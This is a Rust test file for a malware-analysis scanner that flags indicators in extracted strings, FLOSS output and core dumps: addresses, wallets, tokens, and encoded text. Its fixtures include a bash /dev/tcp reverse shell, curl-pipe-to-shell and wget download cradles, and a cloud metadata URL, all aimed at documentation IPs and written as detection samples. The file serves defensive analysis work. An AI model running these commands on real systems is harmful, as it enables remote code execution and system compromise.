// SPDX-License-Identifier: GPL-3.0-only
use super::*;
use crate::{
    analysis::{
        AnalysisAddressKind, AnalysisData, AnalysisEntry, AnalysisKind, AnalysisListing,
        AnalysisLocation, AnalysisRange, AnalysisRecord, AnalysisReport, AnalysisSection,
        AnalysisSectionState, AnalysisState,
    },
    core_dump::{CoreDump, CoreMapping},
    core_strings::CoreString,
};
use std::sync::atomic::{AtomicBool, AtomicU64};

fn rules() -> RuleSet {
    RuleSet::build(&Config::default())
}

fn origin() -> Origin {
    Origin {
        label: "Strings".into(),
        position: Some(1000),
        unit: 1,
        space: "offset",
    }
}

fn scan_of(texts: &[&str]) -> Scan {
    let rules = rules();
    let mut scan = Scan::default();
    for text in texts {
        rules.scan_text(text, &origin(), &mut scan);
    }
    scan
}

/// (type, text) of every match, sorted.
fn found(texts: &[&str]) -> Vec<(String, String)> {
    let mut rows: Vec<_> = scan_of(texts)
        .matches
        .into_iter()
        .map(|m| (m.kind, m.text))
        .collect();
    rows.sort();
    rows
}

fn has(rows: &[(String, String)], kind: &str, text: &str) -> bool {
    rows.iter().any(|(k, t)| k == kind && t == text)
}

#[test]
fn network_patterns_find_their_type_and_leave_other_text_alone() {
    let rows = found(&[
        "connect to 203.0.113.9 now",
        "gateway 192.168.1.1",
        "see https://evil.example.com/gate.php?id=1, then",
        "mail admin@evil.example.org",
        "abcdefghij234567.onion",
        "visit pastebin.com/raw/AbC123",
        "https://abc123.ngrok-free.app/x",
        "stratum+tcp://pool.minexmr.com:4444",
        "fe80::1ff:fe23:4567:890a",
        "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_",
        "123456789:AAEhBOweik6ad9r_QXMENQjcrGbqCr4K1ib",
        "nothing to see in this line",
    ]);
    assert!(
        has(&rows, "IPv4 (public)", "203.0.113.9")
            || has(&rows, "IPv4 (documentation)", "203.0.113.9")
    );
    assert!(has(&rows, "IPv4 (private)", "192.168.1.1"));
    assert!(has(
        &rows,
        "URL (https)",
        "https://evil.example.com/gate.php?id=1"
    ));
    assert!(has(&rows, "Email", "admin@evil.example.org"));
    assert!(has(&rows, "Onion address", "abcdefghij234567.onion"));
    assert!(
        rows.iter()
            .any(|(k, t)| k == "Paste site" && t.starts_with("pastebin.com"))
    );
    assert!(rows.iter().any(|(k, _)| k == "Tunnel service"));
    assert!(has(
        &rows,
        "Stratum pool",
        "stratum+tcp://pool.minexmr.com:4444"
    ));
    assert!(has(&rows, "IPv6 (link-local)", "fe80::1ff:fe23:4567:890a"));
    assert!(rows.iter().any(|(k, _)| k == "Discord webhook"));
    assert!(rows.iter().any(|(k, _)| k == "Telegram bot token"));
    // The host of a URL or an email is part of it, not a domain of its own.
    assert!(
        !rows
            .iter()
            .any(|(k, t)| k == "Domain" && t == "evil.example.com")
    );
    assert!(
        !rows
            .iter()
            .any(|(k, t)| k == "Domain" && t == "evil.example.org")
    );
}

#[test]
fn domains_need_a_public_suffix_and_skip_file_names_and_identifiers() {
    let rows = found(&[
        "beacon.badhost.net",
        "libssl.so",
        "install.sh",
        "run.py",
        "README.md",
        "strings.Builder",
        "os.Exit",
        "config.json",
        "node.unknowntld",
        "co.uk",
        "www.bbc.co.uk",
    ]);
    let domains: Vec<_> = rows
        .iter()
        .filter(|(k, _)| k == "Domain")
        .map(|(_, t)| t.as_str())
        .collect();
    assert_eq!(domains, ["beacon.badhost.net", "www.bbc.co.uk"]);
    // A scheme says it is a host even where the suffix looks like a file.
    let rows = found(&["http://payload.sh/x"]);
    assert!(has(&rows, "URL (http)", "http://payload.sh/x"));
}

#[test]
fn version_numbers_are_not_addresses() {
    let rows = found(&[
        "version 1.2.3.4",
        "v10.20.30.40 released",
        "libfoo 2.4.1.9-beta",
        "1.2.3.4.5",
        "300.1.1.1",
        "01.2.3.4",
        "0.1.2.3",
        "server 8.8.8.8",
    ]);
    let ips: Vec<_> = rows
        .iter()
        .filter(|(k, _)| k.starts_with("IPv4"))
        .map(|(_, t)| t.as_str())
        .collect();
    assert_eq!(ips, ["8.8.8.8"]);
}

#[test]
fn crypto_addresses_must_pass_their_checksums() {
    let rows = found(&[
        // Bitcoin's genesis address and a one-character corruption of it.
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb",
        "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
        "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdr",
        "0x52908400098527886E0F7030069857D2E4169EE7",
        "0x0000000000000000000000000000000000000000",
        "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
    ]);
    assert!(has(
        &rows,
        "Bitcoin address (P2PKH)",
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
    ));
    assert!(!has(
        &rows,
        "Bitcoin address (P2PKH)",
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"
    ));
    assert!(has(
        &rows,
        "Bitcoin address (bech32)",
        "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
    ));
    assert!(!rows.iter().any(|(_, t)| t.ends_with("gtzzwf5mdr")));
    assert!(rows.iter().any(|(k, _)| k == "Ethereum address"));
    assert!(!rows.iter().any(|(_, t)| t.starts_with("0x0000")));
    assert!(rows.iter().any(|(k, _)| k.starts_with("Monero address")));
}

#[test]
fn tox_ids_carry_a_checksum() {
    let mut id = vec![0x11u8; 36];
    id[1] = 0x22;
    let mut sum = [0u8; 2];
    for (n, byte) in id.iter().enumerate() {
        sum[n % 2] ^= byte;
    }
    id.extend(sum);
    let good: String = id.iter().map(|b| format!("{b:02X}")).collect();
    let mut bad = good.clone();
    bad.replace_range(74..76, "00");
    assert!(found(&[&good]).iter().any(|(k, _)| k == "Tox ID"));
    assert!(!found(&[&bad]).iter().any(|(k, _)| k == "Tox ID"));
}

#[test]
fn keys_and_tokens_are_recognised() {
    let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
    let not_jwt = "eyJmb28iOiJiYXIifQ.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U";
    let ssh = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl user@host";
    let rows = found(&[
        jwt,
        not_jwt,
        ssh,
        "-----BEGIN OPENSSH PRIVATE KEY-----",
        "AKIAIOSFODNN7EXAMPLE",
        "ghp_16C7e42F292c6912E7710c838347Ae178B4a",
    ]);
    assert!(
        rows.iter()
            .any(|(k, t)| k == "JSON Web Token (HS256)" && t == jwt)
    );
    assert!(!rows.iter().any(|(_, t)| t == not_jwt));
    assert!(
        rows.iter()
            .any(|(k, _)| k == "SSH public key (ssh-ed25519)")
    );
    assert!(rows.iter().any(|(k, _)| k == "PEM block"));
    assert!(rows.iter().any(|(k, _)| k == "AWS access key id"));
    assert!(rows.iter().any(|(k, _)| k == "GitHub token"));
}

#[test]
fn linux_behaviour_and_attribution_strings_are_recognised() {
    let rows = found(&[
        "curl -s http://198.51.100.7/x.sh | bash",
        "wget http://198.51.100.7/a -O /tmp/a; chmod +x /tmp/a",
        "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
        "/etc/cron.d/update",
        "/etc/systemd/system/evil.service",
        "/home/user/projects/loader/src/main.c",
        "/rustc/0123456789abcdef0123456789abcdef01234567/library/core/src/fmt.rs",
        "github.com/someone/implant",
        "$Info: This file is packed with the UPX executable packer http://upx.sf.net $",
        "TracerPid:\t0",
        "http://169.254.169.254/latest/meta-data/",
    ]);
    let kinds: Vec<&str> = rows.iter().map(|(k, _)| k.as_str()).collect();
    for kind in [
        "Download cradle",
        "Reverse shell",
        "Persistence path",
        "Build path",
        "Rust path",
        "Go path",
        "Packer marker",
        "Anti-analysis",
        "Cloud metadata",
    ] {
        assert!(kinds.contains(&kind), "{kind} in {kinds:?}");
    }
}

#[test]
fn base64_and_hex_are_decoded_and_scanned_again() {
    // "download http://198.51.100.7/payload and run it" in base64, and the
    // same text in hex.
    let b64 = "ZG93bmxvYWQgaHR0cDovLzE5OC41MS4xMDAuNy9wYXlsb2FkIGFuZCBydW4gaXQ=";
    let hex = "646f776e6c6f61642068747470733a2f2f6576696c2e6578616d706c652e636f6d2f782074686973";
    let scan = scan_of(&[b64, hex]);
    let url = scan
        .matches
        .iter()
        .find(|m| m.kind == "URL (http)")
        .expect("url inside base64");
    assert_eq!(url.via, ["base64"]);
    assert_eq!(url.text, "http://198.51.100.7/payload");
    let url = scan
        .matches
        .iter()
        .find(|m| m.kind == "URL (https)")
        .expect("url inside hex");
    assert_eq!(url.via, ["hex"]);
    let encoded: Vec<_> = scan
        .matches
        .iter()
        .filter(|m| m.category == Category::Encoded)
        .map(|m| m.kind.as_str())
        .collect();
    assert_eq!(encoded, ["base64 (text)", "hex (text)"]);
    assert_eq!(scan.counts[&Category::Encoded], 2);
    // Nothing decodable: a hash, a long identifier and random bytes.
    let none = scan_of(&[
        "d41d8cd98f00b204e9800998ecf8427e",
        "ThisIsAVeryLongIdentifierNameForAFunction",
        "qZ8vRk3JdPw0xYb7LmN2sHc9TfUe5GaV",
    ]);
    assert_eq!(none.counts.get(&Category::Encoded), None);
    // An ELF image in base64 is reported by its type and not scanned as text.
    let elf = scan_of(&["f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAQBAAAAAAAAA="]);
    assert!(elf.matches.iter().any(|m| m.kind == "base64 (ELF)"));
}

#[test]
fn decoding_goes_two_levels_deep_and_no_further() {
    let encode = |text: &str| {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut out = String::new();
        for chunk in text.as_bytes().chunks(3) {
            let n = chunk
                .iter()
                .enumerate()
                .fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
            for i in 0..4 {
                if i <= chunk.len() {
                    out.push(ALPHABET[((n >> (18 - 6 * i)) & 63) as usize] as char);
                } else {
                    out.push('=');
                }
            }
        }
        out
    };
    let inner = "fetch http://198.51.100.7/stage2 from the server";
    let two = encode(&encode(inner));
    let three = encode(&two);
    assert!(
        scan_of(&[&two])
            .matches
            .iter()
            .any(|m| m.kind == "URL (http)" && m.via == ["base64", "base64"])
    );
    assert!(
        !scan_of(&[&three])
            .matches
            .iter()
            .any(|m| m.kind == "URL (http)")
    );
}

#[test]
fn matches_keep_their_position_and_repeats_are_counted() {
    let rules = rules();
    let mut scan = Scan::default();
    let utf16 = Origin {
        label: "Strings".into(),
        position: Some(4096),
        unit: 2,
        space: "offset",
    };
    rules.scan_text("ab http://198.51.100.7/a", &origin(), &mut scan);
    rules.scan_text("http://198.51.100.7/a", &origin(), &mut scan);
    rules.scan_text("xx http://203.0.113.50/b", &utf16, &mut scan);
    assert_eq!(scan.strings, 3);
    let first = &scan.matches[0];
    assert_eq!((first.position, first.repeats), (Some(1003), 1));
    let wide = scan
        .matches
        .iter()
        .find(|m| m.text.ends_with("/b"))
        .unwrap();
    assert_eq!(wide.position, Some(4096 + 6));
    assert_eq!(scan.counts[&Category::Network], 3);
    assert_eq!(scan.kinds["URL (http)"], 3);
}

#[test]
fn the_match_list_is_bounded_but_the_counts_are_not() {
    let rules = rules();
    let mut scan = Scan::default();
    for n in 0..(MATCH_MAX_COUNT + 10) {
        let text = format!("http://203.0.{}.{}/p", (n / 250) % 250, n % 250 + 1);
        rules.scan_text(&format!("{text}{n}"), &origin(), &mut scan);
    }
    assert!(scan.truncated);
    assert_eq!(scan.matches.len(), MATCH_MAX_COUNT);
    assert!(scan.total() > MATCH_MAX_COUNT as u64);
}

#[test]
fn patterns_can_be_switched_off_and_custom_ones_added() {
    let mut config = Config::default();
    config.set_enabled("net.ipv4", false);
    config.custom.push(CustomPattern {
        id: "campaign-1".into(),
        name: "Campaign marker".into(),
        category: Category::Attribution,
        pattern: r"(?i)op-[a-z]{4,12}".into(),
        enabled: true,
    });
    config.validate().unwrap();
    let rules = RuleSet::build(&config);
    let mut scan = Scan::default();
    rules.scan_text("gate 203.0.113.9 tag Op-Nightfall", &origin(), &mut scan);
    let kinds: Vec<_> = scan.matches.iter().map(|m| m.kind.as_str()).collect();
    assert_eq!(kinds, ["Campaign marker"]);
    assert!(!config.is_enabled("net.ipv4"));
    config.set_enabled("net.ipv4", true);
    assert!(config.is_enabled("net.ipv4"));
    // A pattern that does not compile, and ones that reuse an id, are refused.
    let mut bad = config.clone();
    bad.custom[0].pattern = "(unclosed".into();
    assert!(bad.validate().is_err());
    let mut again = config.clone();
    again.custom.push(again.custom[0].clone());
    assert!(again.validate().is_err());
    let mut clash = config.clone();
    clash.custom[0].id = "net.ipv4".into();
    assert!(clash.validate().is_err());
    // A saved configuration comes back; a missing one is the defaults.
    let dir =
        std::env::temp_dir().join(format!("ant-regex-config-{}", crate::storage::unique_id()));
    assert_eq!(Config::load(&dir).unwrap(), Config::default());
    config.save(&dir).unwrap();
    let loaded = Config::load(&dir).unwrap();
    assert_eq!(loaded.custom, config.custom);
    let _ = std::fs::remove_dir_all(dir);
}

#[test]
fn a_pattern_that_cannot_compile_is_reported_not_run() {
    let config = Config {
        custom: vec![CustomPattern {
            id: "broken".into(),
            name: "Broken".into(),
            category: Category::Custom,
            pattern: "a{1000000}{1000000}".into(),
            enabled: true,
        }],
        ..Config::default()
    };
    let rules = RuleSet::build(&config);
    assert_eq!(rules.rejected.len(), 1);
    assert_eq!(rules.rejected[0].0, "broken");
}

fn string_row(id: u64, offset: u64, encoding: &str, text: &str) -> AnalysisEntry {
    AnalysisEntry {
        label: encoding.into(),
        value: text.into(),
        offset: Some(offset),
        record: Some(AnalysisRecord {
            revision: 1,
            id,
            location: Some(AnalysisLocation {
                kind: AnalysisAddressKind::FileOffset,
                value: offset,
                file_range: Some(AnalysisRange {
                    offset,
                    len: text.len() as u64,
                }),
            }),
            data: AnalysisData::String {
                encoding: encoding.into(),
                byte_len: text.len() as u64,
                retained_len: text.len() as u64,
            },
        }),
    }
}

fn floss_row(id: u64, text: &str) -> AnalysisEntry {
    AnalysisEntry {
        label: "stack".into(),
        value: text.into(),
        offset: None,
        record: Some(AnalysisRecord {
            revision: 1,
            id,
            location: None,
            data: AnalysisData::FlossString {
                origin: "stack".into(),
                encoding: "ASCII".into(),
                function: None,
                address: None,
            },
        }),
    }
}

fn listed(
    kind: AnalysisKind,
    rows: &[AnalysisEntry],
    directory: &std::path::Path,
) -> AnalysisSection {
    let mut bytes = Vec::new();
    for row in rows {
        bytes.extend(serde_json::to_vec(row).unwrap());
        bytes.push(b'\n');
    }
    std::fs::create_dir_all(directory.join("listings")).unwrap();
    std::fs::write(
        directory.join("listings").join(match kind {
            AnalysisKind::Strings => "strings.jsonl",
            _ => "floss.jsonl",
        }),
        &bytes,
    )
    .unwrap();
    let mut section = AnalysisSection::new(kind);
    section.state = AnalysisSectionState::Complete;
    section.listing = Some(AnalysisListing {
        rows: rows.len() as u64,
        bytes: bytes.len() as u64,
        truncated: false,
    });
    section
}

#[test]
fn a_report_scan_reads_the_strings_and_floss_listings_with_their_offsets() {
    let directory =
        std::env::temp_dir().join(format!("ant-regex-report-{}", crate::storage::unique_id()));
    std::fs::create_dir_all(&directory).unwrap();
    let strings = listed(
        AnalysisKind::Strings,
        &[
            string_row(1, 100, "ASCII", "no match here"),
            string_row(2, 200, "ASCII", "go to http://198.51.100.7/x now"),
        ],
        &directory,
    );
    let floss = listed(
        AnalysisKind::Floss,
        &[floss_row(1, "cmd /c curl -s http://203.0.113.5/s | sh")],
        &directory,
    );
    let report = AnalysisReport {
        id: "r1".into(),
        state: AnalysisState::Complete,
        source_path: "/x".into(),
        specimen_sha256: None,
        specimen_len: Some(100_000),
        reason: None,
        sections: vec![strings, floss],
        layer: None,
        specimen_source: None,
        time_limit_seconds: None,
        limits: None,
    };
    std::fs::write(
        directory.join("report.json"),
        serde_json::to_vec(&report).unwrap(),
    )
    .unwrap();
    let scan = scan_report(&directory, "r1", &rules(), &AtomicBool::new(false)).unwrap();
    assert_eq!(scan.strings, 3);
    let url = scan.matches.iter().find(|m| m.origin == "Strings").unwrap();
    assert_eq!((url.position, url.space), (Some(206), "offset"));
    let cradle = scan
        .matches
        .iter()
        .find(|m| m.kind == "Download cradle")
        .unwrap();
    assert_eq!(cradle.origin, "FLOSS stack");
    assert!(scan_report(&directory, "other", &rules(), &AtomicBool::new(false)).is_err());
    let stopped = scan_report(&directory, "r1", &rules(), &AtomicBool::new(true)).unwrap();
    assert!(stopped.cancelled);
    assert_eq!(stopped.strings, 0);
    let _ = std::fs::remove_dir_all(directory);
}

/// A core whose memory is `memory`, in one mapping at `start`.
fn core(memory: &[u8], start: u64) -> CoreDump {
    let path = std::env::temp_dir().join(format!("ant-regex-core-{}", crate::storage::unique_id()));
    let mut file = vec![0u8; 64];
    file.extend_from_slice(memory);
    std::fs::write(&path, &file).unwrap();
    CoreDump {
        source: path,
        source_size: file.len() as u64,
        threads: Vec::new(),
        mappings: vec![CoreMapping {
            start,
            memory_size: memory.len() as u64,
            file_offset: 64,
            captured_size: memory.len() as u64,
            available_size: memory.len() as u64,
            flags: 6,
        }],
        files: Vec::new(),
        auxv: Vec::new(),
        notes: Vec::new(),
        warnings: Vec::new(),
    }
}

#[test]
fn socket_address_structures_in_a_core_are_found_without_strings() {
    let mut memory = vec![0u8; 256];
    // sockaddr_in 93.184.216.34:443 at 16, and one with port 0 at 48.
    memory[16..18].copy_from_slice(&[2, 0]);
    memory[18..20].copy_from_slice(&443u16.to_be_bytes());
    memory[20..24].copy_from_slice(&[93, 184, 216, 34]);
    memory[48..50].copy_from_slice(&[2, 0]);
    memory[52..56].copy_from_slice(&[10, 0, 0, 1]);
    // sockaddr_in6 [2001:db8::7]:8080 at 96.
    memory[96..98].copy_from_slice(&[10, 0]);
    memory[98..100].copy_from_slice(&8080u16.to_be_bytes());
    memory[104..120].copy_from_slice(
        &"2001:db8::7"
            .parse::<std::net::Ipv6Addr>()
            .unwrap()
            .octets(),
    );
    // Unaligned structures and ones with a dirty padding are not addresses.
    memory[131..133].copy_from_slice(&[2, 0]);
    memory[133..135].copy_from_slice(&80u16.to_be_bytes());
    memory[135..139].copy_from_slice(&[1, 2, 3, 4]);
    memory[160..162].copy_from_slice(&[2, 0]);
    memory[162..164].copy_from_slice(&80u16.to_be_bytes());
    memory[164..168].copy_from_slice(&[1, 2, 3, 4]);
    memory[170] = 9;
    let dump = core(&memory, 0x7f00_0000);
    let found = sockaddrs(&dump, &AtomicBool::new(false), &AtomicU64::new(0)).unwrap();
    std::fs::remove_file(&dump.source).unwrap();
    let rows: Vec<_> = found
        .iter()
        .map(|s| (s.address, s.ip.to_string(), s.port))
        .collect();
    assert_eq!(
        rows,
        [
            (0x7f00_0010, "93.184.216.34".to_owned(), 443),
            (0x7f00_0060, "2001:db8::7".to_owned(), 8080),
        ]
    );
    let mut scan = Scan::default();
    scan.add_sockaddrs(&found);
    let kinds: Vec<_> = scan
        .matches
        .iter()
        .map(|m| (m.kind.as_str(), m.text.as_str()))
        .collect();
    assert_eq!(
        kinds,
        [
            ("sockaddr_in (public)", "93.184.216.34:443"),
            ("sockaddr_in6", "[2001:db8::7]:8080")
        ]
    );
    assert_eq!(scan.matches[0].space, "address");
}

#[test]
fn core_strings_are_scanned_with_their_virtual_addresses() {
    let strings = vec![CoreString {
        address: 0x7000_1000,
        file_offset: 0x100,
        encoding: "UTF-16LE",
        byte_len: 40,
        mapping: 0,
        text: "go http://198.51.100.7/c".into(),
    }];
    let scan = scan_core(&strings, &rules(), &AtomicBool::new(false));
    let url = &scan.matches[0];
    assert_eq!(url.origin, "Core strings");
    assert_eq!(
        (url.position, url.space),
        (Some(0x7000_1000 + 6), "address")
    );
}
